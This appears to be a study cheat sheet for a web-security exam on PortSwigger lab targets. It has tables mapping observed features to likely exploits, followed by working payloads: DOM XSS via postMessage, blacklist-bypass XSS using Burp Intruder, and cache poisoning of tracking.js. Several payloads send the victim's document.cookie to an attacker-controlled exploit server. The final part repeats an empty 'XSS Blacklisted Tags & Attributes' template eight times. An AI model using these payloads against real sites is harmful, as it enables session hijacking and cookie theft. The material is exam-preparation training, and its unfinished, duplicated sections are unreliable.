# Stage 1 - anonymous to user session
## Identify the case
| Case      | Probable exploit |
| ----------- | ----------- |
| tracking.js | Host header poisoning / Cache poisoning |
| <script>alert(1)</script> in the search | XSS |
| Post a comment | HTTP Request Smuggling |
| Different message error when resetting password | Bruteforce | 
| None of the above | Bruteforce |


# Stage 2 - user to administrator session
## Identify the case
| Case      | Probable exploit |
| ----------- | ----------- |
| Advanced search | SQL injection |
| Session cookie with "isloggedin" | CSRF |
| Request in Burp proxy when updating email with "timestamp" | CORS |
| Different message error when resetting password | Bruteforce | 
| JSON request when updating email with answer contained "id" but not in the request | IDOR |
| Able to remove the parameter csrf when updating the email | CSRF |


# Stage 3 - command execution as administrator
## Identify the case
| Case      | Probable exploit |
| ----------- | ----------- |
| Upload XML feature | XXE or XML command injection |
| Change the blog image | SSRF/Remote file inclusion |
| Right click on an image and seeing a size parameter | Command injection |
| An example of template for reset email | SSTI | 
| Download a file for report | SSRF |
| Lots of images and no size parameter | Directory traversal |


# XSS DOM Based
## Detect:
```
GET /

<script>
    window.addEventListener('message', function(e) {
        var img = document.createElement('img'), ACMEplayer = {element: img}, d;
        document.body.appendChild(img);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
            case "redirect":
                window.location.replace(d.redirectUrl);
                break;
        }
    }, false);
</script>
```
## Exploit:
```
<iframe src=https://LAB.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:window.location=%22https://EXPLOIT-SERVER-URL-XX.web-securityacademy.net/?c=%22%2bdocument.cookie\"}","*")' >
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
GET /?find="><script>alert(1)</script>
"Tag is not allowed"
```
## Exploit:
```
GET /?find=<§§> HTTP/1.1
On https://portswigger.net/web-security/cross-site-scripting/cheat-sheet, click the button "Copy tags to clipboard", and then go back to Burp Intruder, and on the payload tab, click "Paste" to insert the list of HTML tags.

GET /?find=<body+§§=''> HTTP/1.1
On https://portswigger.net/web-security/cross-site-scripting/cheat-sheet, click the button "Copy events to clipboard", and then go back to Burp Intruder, and on the payload tab, click "Paste" to insert the list of HTML events.

GET https://LAB-URL-XX/?find=<body+onload=alert(1)>

For onpageshow event etc:
echo "document.location='https://XX-EXPLOIT-SERVER-URL-XX/?x='+document.cookie" | base64
<iframe src="https://LAB-URL-XX/?searchterm='%3Cbody+onload=eval(atob('XX-BASE64-HERE-XX'))%3E//" onload="this.onload='';this.src+='#1'"></iframe>

For onmessage event:
<!DOCTYPE html>
    <body onload="Exploit()">
        <h2>Exploit</h2>
        <p>Exploit OnMessage XSS</p>
        <p>Use target & msg as URL parameters.</p>
        <iframe id="f" height="0" style="visibility:hidden">
        </iframe>
        <script>
            searchParams = new URLSearchParams(document.location.search);
            target = searchParams.get('target');
            msg = searchParams.get('msg');
            document.getElementById('f').setAttribute('src', target);
            function Exploit() {frames[0].postMessage(msg,'*')}
        </script>
    </body>
</html>
<iframe src="https://your-exploit-server-id.exploit-server.net/exploit?target=https://your-lab-id.web-security-academy.net/%3Cbody%20onmessage=document.location=%22https://your-exploit-server-id.exploit-server.net/?c=%22%25%32%62(document.cookie)%3E>">
```
# XSS Filter Bypass
## Detect:
```
Search feature parameter such as searchterm, find, etc.
```
## Exploit:
```

```
# Cache Poisoning
## Detect:
```
GET / HTTP/1.1
Should see "X-Cache: Miss" on first time, and "X-Cache: Hit" on subsequent hits.
```
## Exploit:
```
Exploit server, replace the endpoint from "/exploit" to "/resources/js/tracking.js"

Body:
document.location='https://XX-EXPLOIT-SERVER-URL-XX?x='+document.cookie;

GET / HTTP/1.1
X-Forwarded-For: XX-DOMAIN-NAME-EXPLOIT-SERVER-XX
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
